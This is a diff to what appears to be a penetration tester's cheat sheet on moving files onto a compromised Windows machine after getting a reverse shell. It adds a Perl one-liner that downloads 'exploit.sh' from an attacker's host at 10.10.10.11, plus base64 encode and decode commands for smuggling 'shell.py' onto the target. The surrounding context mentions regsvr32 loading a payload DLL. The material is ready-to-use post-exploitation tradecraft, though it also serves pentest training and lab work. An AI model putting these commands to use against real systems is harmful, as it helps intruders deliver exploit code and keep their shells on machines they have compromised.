@@ -26,6 +26,10 @@ I got stuck with a borked up reverse shell on a Windows system with no file tran
 
 _\(originally sourced from here:_ [_http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html_](http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html)_\)_
 
+### PERL HTTP File Download
+
+`perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.11/exploit.sh"); my $file = $ff->fetch() or die $ff->error;'`
+
 ### Netcat File Transfer
 
 Because if Netcat is on the system, everything becomes easier:
@@ -53,6 +57,16 @@ regsvr32 /s /u C:\temp\payload.dll
 ```
 
 \(_Source:_ [_http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html_](http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html) __\)
+
+### Base64 \(Copy/Paste\)
+
+```bash
+## encode from file with:
+base64 <<< $(cat shell.py) | tr -d "\n"
+
+## decode to file with:
+echo -n "ZmlsZSBjb250ZW50IGhlcmUK" | base64 -d > shell.py
+```
 
 ## REVERSE SHELLS / SHELLS
 
